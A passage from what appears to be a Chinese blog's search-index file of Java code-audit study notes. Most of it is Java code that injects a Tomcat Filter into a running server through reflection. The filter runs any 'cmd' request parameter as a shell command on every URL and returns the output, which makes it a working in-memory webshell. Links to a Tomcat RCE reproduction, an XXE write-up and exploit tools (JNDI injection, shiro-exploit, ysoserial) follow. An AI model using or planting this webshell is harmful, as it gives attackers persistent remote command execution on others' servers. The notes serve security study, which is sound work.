class="hljs-string">&quot;cmd&quot;</span>);<br>                            String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>                            &#125;<br>                            commands[<span class="hljs-number">2</span>] = cmd;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                        &#125;<br>                        filterChain.doFilter(servletRequest, servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>                    &#125;<br><br>                &#125;;<br><br>                <span class="hljs-comment">//创建FilterDef对象 并添加 filter对象，filtername, filter类</span><br>                <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilter(filter);<br>                filterDef.setFilterName(name);<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                <span class="hljs-comment">//通过addFilterDef方法添加 filterDef 方法</span><br>                standardContext.addFilterDef(filterDef);<br><br>                <span class="hljs-comment">//创建FilterMap对象，并添加 filter映射，filtername</span><br>                <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>                filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                filterMap.setFilterName(name);<br>                <span class="hljs-comment">//这个不要忘记了</span><br>                filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>                <span class="hljs-comment">//通过addFilterMapBefore方法添加filterMap对象</span><br>                standardContext.addFilterMapBefore(filterMap);<br><br>                <span class="hljs-comment">//通过前面获取的filtermaps的put方法放入filterConfig</span><br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>                filterConfigs.put(name, filterConfig);<br><br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="tomcat中间件漏洞"><a href="#tomcat中间件漏洞" class="headerlink" title="tomcat中间件漏洞"></a>tomcat中间件漏洞</h3><ul><li><p>最新RCE漏洞</p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCE复现 - FreeBuf网络安全行业门户</a></p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">记一次开源cms的Java代审 (qq.com)</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>Beynd Compare：文件对比工具，对比两个文件找到不同版本代码的差别</li><li>jndi注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</li><li>shiro反序列化工具：<a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></li><li>反序列化工具：ysoserial   <a href="https://blog.csdn.net/st3pby/article/details/135111050">Java反序列化工具ysoserial使用-CSDN博客</a></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><p>使用sqlmap时经常无法测出注入点</p></li><li><p>尝试网上方法修改源代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/%E6%B3%A8%E5%85%A5%E7%82%B9.png"></p><p>发现此代码是控制404的响应结果的，注释掉会让sqlmap强行检测注入点</p></li><li><p>问题未解决，依旧无法测出注入点</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
